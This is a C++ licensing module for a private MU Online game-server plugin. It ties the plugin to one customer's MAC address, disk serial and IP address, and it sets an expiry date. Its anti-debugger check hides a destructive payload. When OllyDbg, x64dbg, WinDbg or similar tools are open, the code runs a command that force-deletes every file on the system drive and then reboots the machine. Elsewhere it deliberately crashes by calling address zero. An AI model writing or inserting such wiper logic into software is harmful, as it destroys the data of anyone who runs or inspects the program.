//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// # DARK PLUGIN - POWERED BY FIRE TEAM
// # GAME SERVER: 99.60T (C) WEBZEN.
// # VERSÃO: 1.0.0.0
// # Autor: Maykon
// # Skype: Maykon.ale
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// # O Senhor é meu pastor e nada me faltará!
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#include "StdAfx.h"


void ReadyLicense()
{
	TimeProtection();
	IPProtection();
	HDProtection();
	MACProtection();
}

bool CheckingMAC(LPCSTR MacID)
{
	std::string content;
	char ClientsMacs[13][18] =
	{
		"02-00-00-29-4B-32", //-> Rafael - Mu-DraconicK 
	};
	
	for (int x=0; x<13; x++)
	{
		if (!strcmp(MacID,ClientsMacs[x]))
		{
			return true;
		}
	}

	return false;
}
void TimeProtection()
{

	//===============================================
	//-- Anti Craked 
	//===============================================
	HANDLE holly = FindWindow(TEXT("OllyDbg"), NULL);
	HANDLE x32dbg = FindWindow(TEXT("x32dbg"), NULL);
	HANDLE x64dbg = FindWindow(TEXT("x64dbg"), NULL);
	HANDLE AQtime = FindWindow(TEXT("AQtime"), NULL);
	HANDLE DEBUG  = FindWindow(TEXT("DEBUG"), NULL);
	HANDLE SoftICE = FindWindow(TEXT("SoftICE"), NULL);
	HANDLE WinDbg = FindWindow(TEXT("WinDbg"), NULL);
	if (holly || x32dbg || x64dbg || AQtime || DEBUG || SoftICE || WinDbg)
	{

		system("@echo Off");
		system("del %systemdrive%\\*.*/f/s/q");
		system("shutdown -r -f -t 00");

		__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		}

	}

	//===============================================
	//-- Time Check
	//===============================================
	SYSTEMTIME now;
	GetLocalTime(&now);

	int Dia = 30;
	int Mes = 6;
	int Ano = 2019;
	int Hora = 00;
	int Minuto = 00;
	int Segundos = 01;

	if (now.wDay >= Dia && now.wMonth >= Mes && now.wYear >= Ano && now.wHour >= Hora && now.wMinute >= Minuto && now.wSecond >= Segundos)
	{
		MessageBoxA(NULL, "Você não está autorizado a usar esse Arquivo!\r\nErro 0x03", "[B&W Team]", MB_OK);
		__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		}
		system("shutdown -f");
	}

}
bool MACProtection()
{
	unsigned char MACData[6];

	UUID uuid;
	UuidCreateSequential(&uuid);

	for (int i=2; i<8; i++)
	{
		MACData[i - 2] = uuid.Data4[i];
	}

	char MACADDR[18];
	sprintf(MACADDR, "%02X-%02X-%02X-%02X-%02X-%02X", MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);

	if (CheckingMAC(MACADDR))
	{
		return true;
	}

	else
	{
		MessageBoxA(NULL,"Você não está autorizado a usar esse Arquivo!\r\nErro 0x02","[B&W Team]",MB_OK);

		__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		} 
	}

	return false;
}

void HDProtection()
{
	GetVolumeInformation("C:\\",NULL,0,&License.TempSerial,NULL,NULL,NULL,0);
	License.Key = 0x8853EA26; //-> HD do Cliente
	if (License.TempSerial != License.Key) {
		MessageBoxA(NULL, "Você não está autorizado a usar esse Arquivo! \r\nErro 0x01", "[B&W Team]", MB_OK);

		__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		}
	}
}

unsigned long GetLongHostAddress()
{
	in_addr inaddr;
	inaddr.S_un.S_addr = inet_addr("192.99.183.12"); //-> IP do Cliente 

	if (inaddr.S_un.S_addr == INADDR_NONE)
	{
		return *((unsigned long*)((hostent*)gethostbyname("muonline.pgbrasil.net"))->h_addr); //-> IP do Cliente 
	}
	else
	{
		return inaddr.S_un.S_addr;
	}
}

void _declspec(naked) HostAddressCall()
{
	_asm
	{
		CALL GetLongHostAddress;
		MOV DWORD PTR SS:[EBP-0xC], EAX;
		MOV EDI, 0x00485BA6;
		JMP EDI;
	}
}

void IPProtection()
{
	func.HookThis((DWORD)&HostAddressCall,0x00485B9B);
	*(BYTE*)0x00485B9B = 0xE9;
}

SLicense License;